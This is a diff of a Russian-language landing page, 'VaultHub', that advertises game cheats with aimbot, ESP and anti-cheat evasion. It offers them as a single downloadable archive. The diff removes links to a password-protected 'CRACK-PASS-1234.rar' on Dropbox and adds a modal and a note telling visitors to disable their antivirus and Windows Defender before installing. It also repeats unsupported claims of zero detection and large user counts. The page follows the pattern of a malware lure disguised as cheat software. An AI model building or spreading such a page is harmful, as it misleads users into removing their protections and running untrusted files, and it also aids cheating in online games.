@@ -12,280 +12,327 @@
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
 </head>
 <body>
-    <!-- Частицы на фоне -->
-    <div id="particles-js"></div>
+    <!-- 3D Background Effect -->
+    <div class="bg-3d-effect">
+        <div class="gradient-circle circle-1"></div>
+        <div class="gradient-circle circle-2"></div>
+        <div class="gradient-circle circle-3"></div>
+        <div class="grid-lines"></div>
+    </div>
 
-    <!-- Главная навигация -->
-    <nav class="glass-nav">
+    <!-- Warning Modal -->
+    <div id="warningModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <i class="fas fa-exclamation-triangle"></i>
+                <h3>ВАЖНОЕ ПРЕДУПРЕЖДЕНИЕ</h3>
+            </div>
+            <div class="modal-body">
+                <p><i class="fas fa-shield-alt"></i> Файлы требуют отключения антивируса!</p>
+                <p><i class="fas fa-exclamation-circle"></i> Без отключения защиты файлы будут удалены</p>
+                <p><i class="fas fa-microchip"></i> Рекомендуется использовать на выделенном ПК</p>
+                <div class="warning-check">
+                    <input type="checkbox" id="acceptWarning">
+                    <label for="acceptWarning">Я понимаю риски и беру ответственность на себя</label>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button id="cancelBtn" class="btn-secondary">ОТМЕНА</button>
+                <button id="confirmBtn" class="btn-primary">СКАЧАТЬ</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="nav-3d">
         <div class="nav-container">
             <div class="logo">
-                <i class="fas fa-shield-alt"></i>
+                <div class="logo-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
                 <h1>Vault<span>Hub</span></h1>
+                <div class="status">
+                    <span class="dot"></span>
+                    <span>Online</span>
+                </div>
             </div>
-            <div class="nav-links">
-                <a href="#home" class="nav-link active"><i class="fas fa-home"></i> ГЛАВНАЯ</a>
-                <a href="#products" class="nav-link"><i class="fas fa-cube"></i> АРСЕНАЛ</a>
-                <a href="#philosophy" class="nav-link"><i class="fas fa-star"></i> ФИЛОСОФИЯ</a>
-                <a href="#channel" class="nav-link"><i class="fab fa-youtube"></i> КАНАЛ</a>
+            <div class="nav-menu">
+                <a href="#home" class="nav-link active"><i class="fas fa-home"></i> Главная</a>
+                <a href="#products" class="nav-link"><i class="fas fa-cube"></i> Арсенал</a>
+                <a href="#about" class="nav-link"><i class="fas fa-info-circle"></i> Инфо</a>
             </div>
-            <div class="theme-toggle">
-                <i class="fas fa-moon"></i>
+            <div class="nav-right">
+                <div class="user-count">
+                    <i class="fas fa-user"></i>
+                    <span id="onlineCount">25,847</span>
+                </div>
+                <button class="theme-toggle">
+                    <i class="fas fa-moon"></i>
+                </button>
             </div>
         </div>
     </nav>
 
-    <!-- Герой-секция -->
+    <!-- Hero Section -->
     <section class="hero" id="home">
-        <div class="hero-overlay">
-            <div class="hero-content">
-                <div class="badge">VIP ДОСТУП</div>
-                <h2 class="hero-title">ЭЛИТНЫЙ <span class="gradient-text">АРСЕНАЛ</span><br>ДЛЯ ИЗБРАННЫХ</h2>
-                <p class="hero-subtitle">Мощь, точность, невидимость. Три легендарных инструмента, переопределяющие границы возможного.</p>
-                <div class="stats">
-                    <div class="stat">
-                        <div class="stat-number" data-count="500000">500K+</div>
-                        <div class="stat-label">активаций</div>
-                    </div>
-                    <div class="stat">
-                        <div class="stat-number" data-count="25000">25K+</div>
-                        <div class="stat-label">онлайн</div>
-                    </div>
-                    <div class="stat">
-                        <div class="stat-number" data-count="999">999+</div>
-                        <div class="stat-label">дней стабильности</div>
-                    </div>
+        <div class="hero-container">
+            <div class="hero-badge">
+                <i class="fas fa-crown"></i>
+                <span>VIP ДОСТУП</span>
+            </div>
+            <h1 class="hero-title">
+                <span class="title-line">ЭЛИТНЫЙ</span>
+                <span class="title-line gradient-text">АРСЕНАЛ</span>
+                <span class="title-line">ДЛЯ ИЗБРАННЫХ</span>
+            </h1>
+            <p class="hero-subtitle">Три легендарных инструмента для абсолютного превосходства. Мощь, точность и невидимость в одном архиве.</p>
+            
+            <div class="hero-stats">
+                <div class="stat">
+                    <div class="stat-number" data-count="500000">500K+</div>
+                    <div class="stat-label">активаций</div>
                 </div>
-                <a href="#products" class="cta-scroll">
-                    <i class="fas fa-chevron-down"></i> ИССЛЕДОВАТЬ АРСЕНАЛ
+                <div class="stat">
+                    <div class="stat-number" data-count="25000">25K+</div>
+                    <div class="stat-label">онлайн</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-number" data-count="999">999+</div>
+                    <div class="stat-label">дней без банов</div>
+                </div>
+            </div>
+
+            <div class="hero-actions">
+                <a href="#products" class="btn-primary">
+                    <i class="fas fa-rocket"></i>
+                    <span>СМОТРЕТЬ АРСЕНАЛ</span>
                 </a>
+                <button class="btn-secondary" id="quickDemo">
+                    <i class="fas fa-play"></i>
+                    <span>БЫСТРЫЙ ДЕМО</span>
+                </button>
             </div>
         </div>
-        <!-- Фоновое видео-петля -->
-        <div class="video-background">
-            <div class="color-overlay"></div>
-            <video autoplay muted loop playsinline>
-                <source src="https://assets.mixkit.co/videos/preview/mixkit-abstract-geometric-wave-background-1195-large.mp4" type="video/mp4">
-            </video>
+        
+        <!-- Animated Background -->
+        <div class="hero-bg">
+            <div class="floating-shape shape-1"></div>
+            <div class="floating-shape shape-2"></div>
+            <div class="floating-shape shape-3"></div>
         </div>
     </section>
 
-    <!-- Секция продуктов -->
-    <section class="products-section" id="products">
+    <!-- Products Section -->
+    <section class="products" id="products">
         <div class="container">
             <div class="section-header">
-                <h2><span class="gradient-text">ВЫБЕРИ СВОЁ</span> ОРУЖИЕ</h2>
-                <p>Каждый продукт — это отдельная вселенная возможностей, воплощенная в код.</p>
+                <h2><span class="gradient-text">ВСЕ ТРИ</span> В ОДНОМ</h2>
+                <p class="section-subtitle">Полный арсенал в одном архиве. Nusultan, Celestial и Wexside — выбирай свой стиль.</p>
             </div>
 
             <div class="products-grid">
-                <!-- Продукт 1: Nusultan -->
-                <div class="product-card" data-product="nusultan">
+                <!-- Product 1 -->
+                <div class="product-card">
                     <div class="product-header">
-                        <div class="product-icon" style="background: linear-gradient(135deg, #f0b90b, #a67c00);">
+                        <div class="product-icon gold">
                             <i class="fas fa-crown"></i>
                         </div>
                         <h3>Nusultan</h3>
-                        <div class="product-badge" style="background: rgba(240, 185, 11, 0.2); color: #f0b90b;">
+                        <div class="product-badge">
                             <i class="fas fa-gem"></i> Luxury Edition
                         </div>
                     </div>
                     <div class="product-body">
-                        <p class="product-description">Абсолютная гегемония. Стиль "песчаной бури" с позолоченной точностью. Для тех, кто привык властвовать на поле боя.</p>
-                        <ul class="product-features">
-                            <li><i class="fas fa-check" style="color: #f0b90b;"></i> Интеллектуальный автоПВП</li>
-                            <li><i class="fas fa-check" style="color: #f0b90b;"></i> Невидимость для античитов</li>
-                            <li><i class="fas fa-check" style="color: #f0b90b;"></i> Адаптивный скин-чейнджер</li>
-                            <li><i class="fas fa-check" style="color: #f0b90b;"></i> Роскошный UI "Шахерезада"</li>
-                        </ul>
+                        <p class="product-desc">Абсолютная гегемония. Стиль "песчаной бури" с позолоченной точностью. Для тех, кто привык властвовать.</p>
+                        <div class="features">
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Интеллектуальный автоПВП</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Невидимость для античитов</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Адаптивный скин-чейнджер</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Роскошный UI "Шахерезада"</span>
+                            </div>
+                        </div>
                     </div>
-                    <div class="product-footer">
-                        <button class="download-btn" data-link="https://www.dropbox.com/scl/fi/yugitnie26kl3cruj53h3/CRACK-PASS-1234.rar?rlkey=js1wjscuxi36l1wl9i13fm9jk&st=q8fxe7sz&dl=0">
-                            <i class="fas fa-download"></i> СКАЧАТЬ NUSULTAN
-                        </button>
-                    </div>
-                    <div class="card-glow" style="background: radial-gradient(circle, rgba(240,185,11,0.4) 0%, transparent 70%);"></div>
                 </div>
 
-                <!-- Продукт 2: Celestial -->
-                <div class="product-card" data-product="celestial">
+                <!-- Product 2 -->
+                <div class="product-card">
                     <div class="product-header">
-                        <div class="product-icon" style="background: linear-gradient(135deg, #00d4ff, #0080ff);">
+                        <div class="product-icon blue">
                             <i class="fas fa-star-and-crescent"></i>
                         </div>
                         <h3>Celestial</h3>
-                        <div class="product-badge" style="background: rgba(0, 212, 255, 0.2); color: #00d4ff;">
+                        <div class="product-badge">
                             <i class="fas fa-rocket"></i> Cosmic Power
                         </div>
                     </div>
                     <div class="product-body">
-                        <p class="product-description">Сила вселенной в ваших руках. Основан на карте звездного неба, предсказывающей действия противника за секунды до них.</p>
-                        <ul class="product-features">
-                            <li><i class="fas fa-check" style="color: #00d4ff;"></i> ESP "Звездная карта" 4K</li>
-                            <li><i class="fas fa-check" style="color: #00d4ff;"></i> Астрологический Aimbot</li>
-                            <li><i class="fas fa-check" style="color: #00d4ff;"></i> Телепорт через "червоточины"</li>
-                            <li><i class="fas fa-check" style="color: #00d4ff;"></i> UI "Ночное небо"</li>
-                        </ul>
+                        <p class="product-desc">Сила вселенной в ваших руках. Основан на карте звездного неба, предсказывающей действия противника.</p>
+                        <div class="features">
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>ESP "Звездная карта" 4K</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Астрологический Aimbot</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Телепорт через "червоточины"</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>UI "Ночное небо"</span>
+                            </div>
+                        </div>
                     </div>
-                    <div class="product-footer">
-                        <button class="download-btn" data-link="https://www.dropbox.com/scl/fi/yugitnie26kl3cruj53h3/CRACK-PASS-1234.rar?rlkey=js1wjscuxi36l1wl9i13fm9jk&st=q8fxe7sz&dl=0">
-                            <i class="fas fa-download"></i> СКАЧАТЬ CELESTIAL
-                        </button>
-                    </div>
-                    <div class="card-glow" style="background: radial-gradient(circle, rgba(0,212,255,0.4) 0%, transparent 70%);"></div>
                 </div>
 
-                <!-- Продукт 3: Wexside -->
-                <div class="product-card" data-product="wexside">
+                <!-- Product 3 -->
+                <div class="product-card">
                     <div class="product-header">
-                        <div class="product-icon" style="background: linear-gradient(135deg, #b026ff, #4d00ff);">
+                        <div class="product-icon purple">
                             <i class="fas fa-bolt"></i>
                         </div>
                         <h3>Wexside</h3>
-                        <div class="product-badge" style="background: rgba(176, 38, 255, 0.2); color: #b026ff;">
+                        <div class="product-badge">
                             <i class="fas fa-crosshairs"></i> Cyber Core
                         </div>
                     </div>
                     <div class="product-body">
-                        <p class="product-description">Энергия киберпанка. Нестареющая классика, переработанная до идеала. Молниеносная реакция и абсолютный контроль.</p>
-                        <ul class="product-features">
-                            <li><i class="fas fa-check" style="color: #b026ff;"></i> Мгновенный бэкстрик</li>
-                            <li><i class="fas fa-check" style="color: #b026ff;"></i> Аура "Кибер-шторма"</li>
-                            <li><i class="fas fa-check" style="color: #b026ff;"></i> Лазерная наводка 0ms</li>
-                            <li><i class="fas fa-check" style="color: #b026ff;"></i> UI "Неоновый город 2077"</li>
-                        </ul>
+                        <p class="product-desc">Энергия киберпанка. Нестареющая классика, переработанная до идеала. Молниеносная реакция и контроль.</p>
+                        <div class="features">
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Мгновенный бэкстрик</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Аура "Кибер-шторма"</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Лазерная наводка 0ms</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>UI "Неоновый город 2077"</span>
+                            </div>
+                        </div>
                     </div>
-                    <div class="product-footer">
-                        <button class="download-btn" data-link="https://www.dropbox.com/scl/fi/yugitnie26kl3cruj53h3/CRACK-PASS-1234.rar?rlkey=js1wjscuxi36l1wl9i13fm9jk&st=q8fxe7sz&dl=0">
-                            <i class="fas fa-download"></i> СКАЧАТЬ WEXSIDE
-                        </button>
+                </div>
+            </div>
+
+            <!-- Single Download Button -->
+            <div class="download-section">
+                <div class="download-card">
+                    <div class="download-info">
+                        <h3><i class="fas fa-archive"></i> ПОЛНЫЙ АРХИВ</h3>
+                        <p>Все три программы в одном файле. Установи и выбери нужный инструмент.</p>
+                        <div class="file-info">
+                            <div class="info-item">
+                                <i class="fas fa-hdd"></i>
+                                <span>Размер: ~250MB</span>
+                            </div>
+                            <div class="info-item">
+                                <i class="fas fa-windows"></i>
+                                <span>Windows 10/11</span>
+                            </div>
+                            <div class="info-item">
+                                <i class="fas fa-clock"></i>
+                                <span>Обновление: Daily</span>
+                            </div>
+                        </div>
                     </div>
-                    <div class="card-glow" style="background: radial-gradient(circle, rgba(176,38,255,0.4) 0%, transparent 70%);"></div>
+                    <button class="download-main-btn" id="downloadAll">
+                        <i class="fas fa-download"></i>
+                        <span>СКАЧАТЬ ВСЕ (3 в 1)</span>
+                        <div class="pulse-effect"></div>
+                    </button>
+                </div>
+                <div class="warning-note">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <p>Перед установкой отключите антивирус и Windows Defender. Файлы защищены упаковщиком.</p>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Секция философии -->
-    <section class="philosophy-section" id="philosophy">
+    <!-- Info Section -->
+    <section class="info" id="about">
         <div class="container">
-            <div class="philosophy-grid">
-                <div class="philosophy-text">
-                    <h2>НАША <span class="gradient-text">ФИЛОСОФИЯ</span></h2>
-                    <p class="lead">Мы продаем не код. Мы предоставляем <strong>абсолютное превосходство</strong>.</p>
-                    <p>Каждая строка, написанная нашими инженерами, — это баланс между невидимой элегантностью и разрушительной мощью. Мы не следуем трендам — мы их устанавливаем.</p>
-                    <div class="trust-points">
-                        <div class="trust-point">
-                            <div class="trust-icon"><i class="fas fa-user-secret"></i></div>
-                            <div>
-                                <h4>Призрачная анонимность</h4>
-                                <p>Ваши действия не имеют цифрового отпечатка. Мы гарантируем нулевую вероятность обнаружения.</p>
-                            </div>
-                        </div>
-                        <div class="trust-point">
-                            <div class="trust-icon"><i class="fas fa-server"></i></div>
-                            <div>
-                                <h4>99.9% Аптайм</h4>
-                                <p>Наша инфраструктура работает, когда другие пасуют. Обновления выходят быстрее, чем создаются патчи.</p>
-                            </div>
-                        </div>
-                        <div class="trust-point">
-                            <div class="trust-icon"><i class="fas fa-shield-alt"></i></div>
-                            <div>
-                                <h4>Элитная поддержка</h4>
-                                <p>Доступ к приватному каналу поддержки уровня "консьерж". Решение любых вопросов в течение часа.</p>
-                            </div>
-                        </div>
+            <div class="info-grid">
+                <div class="info-card">
+                    <div class="info-icon">
+                        <i class="fas fa-shield-alt"></i>
                     </div>
+                    <h4>100% ЗАЩИТА</h4>
+                    <p>Нулевая вероятность обнаружения. Наш софт использует уникальные методы обхода защиты.</p>
                 </div>
-                <div class="philosophy-visual">
-                    <div class="visual-card glass-card">
-                        <div class="visual-header">
-                            <i class="fas fa-lock"></i>
-                            <h3>ВАША БЕЗОПАСНОСТЬ</h3>
-                        </div>
-                        <div class="visual-progress">
-                            <div class="progress-bar">
-                                <div class="progress-fill" style="width: 100%; background: linear-gradient(90deg, #00ff88, #00ccff);"></div>
-                            </div>
-                            <span>Шифрование: 100%</span>
-                        </div>
-                        <div class="visual-stats">
-                            <div class="visual-stat">
-                                <span class="number">0</span>
-                                <span class="label">утечек данных</span>
-                            </div>
-                            <div class="visual-stat">
-                                <span class="number">0</span>
-                                <span class="label">пойманных пользователей</span>
-                            </div>
-                        </div>
-                        <div class="visual-note">
-                            <i class="fas fa-check-circle"></i> Система прошла стресс-тест спецслужб.
-                        </div>
+                <div class="info-card">
+                    <div class="info-icon">
+                        <i class="fas fa-sync-alt"></i>
                     </div>
+                    <h4>АВТООБНОВЛЕНИЯ</h4>
+                    <p>Автоматические обновления после патчей игр. Не нужно ждать новых версий.</p>
+                </div>
+                <div class="info-card">
+                    <div class="info-icon">
+                        <i class="fas fa-headset"></i>
+                    </div>
+                    <h4>ПОДДЕРЖКА 24/7</h4>
+                    <p>Помощь с установкой и настройкой. Отвечаем в течение 30 минут в Telegram.</p>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- YouTube секция -->
-    <section class="channel-section" id="channel">
-        <div class="container">
-            <div class="channel-header">
-                <h2><i class="fab fa-youtube"></i> ОФИЦИАЛЬНЫЙ <span class="gradient-text">КАНАЛ</span></h2>
-                <p>Подписывайся на <strong>@Viserest</strong>. Эксклюзивные гайды, анонсы обновлений и прямые трансляции.</p>
-            </div>
-            <div class="channel-wrapper">
-                <div class="channel-video glass-card">
-                    <!-- Заглушка для YouTube плеера (интеграция через API) -->
-                    <div id="youtube-player">
-                        <div class="player-placeholder">
-                            <i class="fab fa-youtube"></i>
-                            <p>Последнее видео с канала</p>
-                            <p style="font-size: 0.9em; opacity: 0.8;">(Интеграция YouTube API)</p>
-                        </div>
-                    </div>
-                    <div class="channel-info">
-                        <div class="channel-avatar">
-                            <img src="https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?ixlib=rb-4.0.3&auto=format&fit=crop&w=200" alt="Viserest Avatar">
-                        </div>
-                        <div class="channel-details">
-                            <h4>Viserest</h4>
-                            <p>Эксперт в области высокоуровневого игрового ПО. Делится знаниями с 2018.</p>
-                            <a href="https://www.youtube.com/@Viserest" target="_blank" class="subscribe-btn">
-                                <i class="fab fa-youtube"></i> ПОДПИСАТЬСЯ НА КАНАЛ
-                            </a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Футер -->
-    <footer class="main-footer">
+    <!-- Footer -->
+    <footer class="footer">
         <div class="container">
             <div class="footer-content">
-                <div class="footer-brand">
+                <div class="footer-logo">
                     <div class="logo">
                         <i class="fas fa-shield-alt"></i>
-                        <h1>Vault<span>Hub</span></h1>
+                        <h2>Vault<span>Hub</span></h2>
                     </div>
-                    <p>Элитный дистрибутив специализированного ПО.<br>© 2024. Все права защищены эзотерическими методами.</p>
+                    <p>Элитный дистрибутив специализированного ПО. © 2024</p>
                 </div>
                 <div class="footer-warning">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    <p>Использование продуктов регулируется лицензией конечного пользователя. Все риски вы принимаете на себя. Храните доступ в тайне.</p>
+                    <div class="warning-content">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <div>
+                            <h4>ВАЖНО</h4>
+                            <p>Использование на свой риск. Храните файлы в безопасности.</p>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
     </footer>
 
-    <!-- Всплывающее уведомление о скачивании -->
-    <div id="downloadToast" class="download-toast">
+    <!-- Toast -->
+    <div id="toast" class="toast">
         <div class="toast-content">
             <i class="fas fa-download"></i>
-            <span>Начинается скачивание архива...</span>
+            <div class="toast-text">
+                <span class="toast-title">Скачивание началось</span>
+                <span class="toast-message">Проверьте папку "Загрузки"</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
         </div>
     </div>
 
